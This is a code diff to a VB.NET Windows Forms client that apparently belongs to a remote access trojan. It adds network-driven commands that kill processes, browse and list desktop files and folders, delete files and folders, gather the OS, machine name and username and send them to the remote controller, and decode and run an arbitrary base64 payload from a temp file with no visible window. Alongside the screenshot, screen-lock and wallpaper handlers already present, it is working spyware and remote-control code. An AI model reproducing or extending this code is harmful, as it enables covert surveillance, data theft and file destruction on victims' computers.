@@ -181,15 +181,22 @@ Public Class Form1
     End Sub
 
     Public Sub KillThat(ByVal k As String)
-
+        Dim result As String = ""
         Dim jk As Process() = Process.GetProcesses
         For Each h In jk
 
             If h.ProcessName = k Then
                 Try
                     h.Kill()
+                    result = "Amazingfortaskkill"
+                    Dim buffer() As Byte = Encoding.UTF8.GetBytes(result)
+                    MonClient.GetStream().Write(buffer, 0, buffer.Length)
 
                 Catch ex As Exception
+                    result = "Notgoodfortaskkill"
+                    Dim buffer() As Byte = Encoding.UTF8.GetBytes(result)
+                    MonClient.GetStream().Write(buffer, 0, buffer.Length)
+
                 End Try
             End If
         Next
@@ -201,6 +208,180 @@ Public Class Form1
         Form2.Show()
 
         TextBox1.Text = String.Empty
+    End Sub
+    Public Sub FileManager()
+        Dim Path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
+
+        Dim ListOfGarbage As New StringBuilder
+
+
+        For Each yu In Directory.GetFiles(Path, "*.*", SearchOption.TopDirectoryOnly)
+
+
+            Dim MyNameIsWhat = IO.Path.GetFileName(yu)
+
+
+
+            ListOfGarbage.AppendLine(MyNameIsWhat)
+
+
+
+
+        Next
+        ListOfGarbage.AppendLine("StopFilesNowDir")
+
+        For Each yu In Directory.GetDirectories(Path, "*.*", SearchOption.TopDirectoryOnly)
+
+            Dim MyNameIsWhat = IO.Path.GetFileName(yu)
+
+
+            ListOfGarbage.AppendLine(MyNameIsWhat)
+
+
+
+
+        Next
+
+        ListOfGarbage.Append("StopAllAndSendItRightNow")
+
+        ListOfGarbage.Append(Path)
+
+
+
+
+        Dim buffer() As Byte = Encoding.UTF8.GetBytes(ListOfGarbage.ToString)
+
+        MonClient.GetStream().Write(buffer, 0, buffer.Length)
+        TextBox1.Text = String.Empty
+    End Sub
+
+
+
+    Public Sub FileManagerGoForward(ByVal NewPath As String)
+        Dim Path = NewPath
+
+        Dim ListOfGarbage As New StringBuilder
+
+        '   Dim ListOfDirs As New StringBuilder
+        For Each yu In Directory.GetFiles(Path, "*.*", SearchOption.TopDirectoryOnly)
+            ' Dim lvi As New ListViewItem(yu) 'first column
+
+            Dim MyNameIsWhat = IO.Path.GetFileName(yu)
+
+
+
+            ListOfGarbage.AppendLine(MyNameIsWhat)
+
+
+
+
+        Next
+        ListOfGarbage.AppendLine("StopFilesNowDir")
+
+        For Each yu In Directory.GetDirectories(Path, "*.*", SearchOption.TopDirectoryOnly)
+
+            Dim MyNameIsWhat = IO.Path.GetFileName(yu)
+
+
+            ListOfGarbage.AppendLine(MyNameIsWhat)
+
+
+
+
+        Next
+
+        ListOfGarbage.Append("NoGodPlsNoNOOO")
+
+        ListOfGarbage.Append(Path)
+
+
+
+
+        Dim buffer() As Byte = Encoding.UTF8.GetBytes(ListOfGarbage.ToString)
+
+        MonClient.GetStream().Write(buffer, 0, buffer.Length)
+        TextBox1.Text = String.Empty
+    End Sub
+    Public Sub DeleteSelectedFileOrFolder(ByVal pathfileorfolder As String)
+
+        If pathfileorfolder.EndsWith("FILES") Then
+            Dim filetodelete As String = pathfileorfolder.Replace("@DELETETHISHITFILES", "")
+
+            Try
+                IO.File.Delete(filetodelete)
+                Dim buffer() As Byte = Encoding.UTF8.GetBytes("SuccessWithDeletefolderSS")
+
+                MonClient.GetStream().Write(buffer, 0, buffer.Length)
+            Catch ex As Exception
+                Dim buffer() As Byte = Encoding.UTF8.GetBytes("Couldn't delete the file or the folderSS")
+
+                MonClient.GetStream().Write(buffer, 0, buffer.Length)
+            End Try
+
+
+
+
+        ElseIf pathfileorfolder.EndsWith("FOLDERS") Then
+            Dim foldertodelete As String = pathfileorfolder.Replace("@DELETETHISHITFOLDERS", "")
+            Try
+                IO.Directory.Delete(foldertodelete)
+                Dim buffer() As Byte = Encoding.UTF8.GetBytes("SuccessWithDeletefolderSS")
+
+                MonClient.GetStream().Write(buffer, 0, buffer.Length)
+            Catch ex As Exception
+
+                Dim buffer() As Byte = Encoding.UTF8.GetBytes("Couldn't delete the file or the folderSS")
+
+                MonClient.GetStream().Write(buffer, 0, buffer.Length)
+            End Try
+        End If
+        TextBox1.Text = String.Empty
+
+    End Sub
+    Public Sub GetAllInFoSNeeded()
+        Dim k As String = "System : " & My.Computer.Info.OSFullName
+        'Websocketclient1.DataToSend = k + Helpe.nam
+        '  Public Shared Function nam()
+        Dim l = Environment.UserName
+
+
+        Dim p = Environment.MachineName
+        '    Dim IPaddress As String = Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(Function(ip) ip.AddressFamily = AddressFamily.InterNetwork).ToString()
+        Dim sl = Environment.OSVersion.VersionString
+
+        Dim ooo As String = k + vbCrLf + "Desktop Name : " + p & vbCrLf & "Username : " + l & vbCrLf & "OS Verion : " & sl 'IPaddress
+
+
+        Dim buffer() As Byte = Encoding.UTF8.GetBytes(ooo)
+        MonClient.GetStream().Write(buffer, 0, buffer.Length)
+        '  End Function
+        TextBox1.Text = String.Empty
+    End Sub
+    Public Sub PlayMyAudio(ByVal stsr As String)
+
+
+        Dim tobePlay As String = stsr.Replace("AudioFromPC", "")
+        Dim name As New Random
+        Dim name1 = name.Next(100000, 9999999).ToString
+
+        Dim path As String = IO.Path.GetTempPath & "\" & name1 & ".mp3"
+        Dim k As Byte() = Convert.FromBase64String(tobePlay)
+        IO.File.WriteAllBytes(path, k)
+
+
+        '   My.Computer.Audio.Play(path, AudioPlayMode.Background) Doesn'twork
+        Dim processs As New ProcessStartInfo(path)
+
+
+        processs.CreateNoWindow = True
+        processs.UseShellExecute = True
+
+        Process.Start(processs)
+
+
+        TextBox1.Text = String.Empty
+
+
     End Sub
     Private Sub NouveauMessage(ByVal message As String, ByVal Fermé As Boolean)
         TextBox1.AppendText(message)
@@ -251,6 +432,57 @@ Public Class Form1
 
             ScreenLock()
 
+
+            ''INfo
+
+        ElseIf TextBox1.Text = "IWouldLikeToGetSysInfo" Then
+
+
+            GetAllInFoSNeeded()
+            'IWouldLikeToseeYourFile
+
+
+            ''AudioFromPC
+
+        ElseIf TextBox1.Text.EndsWith("AudioFromPC") Then
+
+            PlayMyAudio(TextBox1.Text)
+
+
+            ''
+
+        ElseIf TextBox1.Text.EndsWith("IWouldLikeToseeYourFile") Then  'FileManager 
+
+
+
+
+            FileManager()
+
+
+        ElseIf TextBox1.Text.EndsWith("@wheretogo") Then  'FileManager 
+
+
+            Dim NewPathforward As String = TextBox1.Text.Replace("@wheretogo", "")
+            FileManagerGoForward(NewPathforward)
+            '    "||wheretogo"
+            ''''FM
+            '
+            '
+        ElseIf TextBox1.Text.EndsWith("@ShitWegoback") Then  'FileManager 
+
+
+            Dim NewPathBack As String = TextBox1.Text.Replace("@ShitWegoback", "")
+
+            Dim NewPath As String = IO.Directory.GetParent(NewPathBack).FullName
+            FileManagerGoForward(NewPath)
+            '    "||wheretogo"
+
+            ''
+            '
+            '
+            '
+            '
+
         ElseIf TextBox1.Text.EndsWith("SetWallpaperGoodSir") Then  ''WALLPAPER
 
             Dim j As String = TextBox1.Text.Replace("SetWallpaperGoodSir", "")
@@ -285,7 +517,12 @@ Public Class Form1
 
             UDPTIMER.Start()
 
+            ''
+        ElseIf TextBox1.Text.Contains("@DELETETHISHIT") Then 'DELETE FILE FROM FM
 
+            DeleteSelectedFileOrFolder(TextBox1.Text)
+
+            ''
 
         ElseIf TextBox1.Text = "TakeAPhotooo561" Then  'SCREENSHOT
 
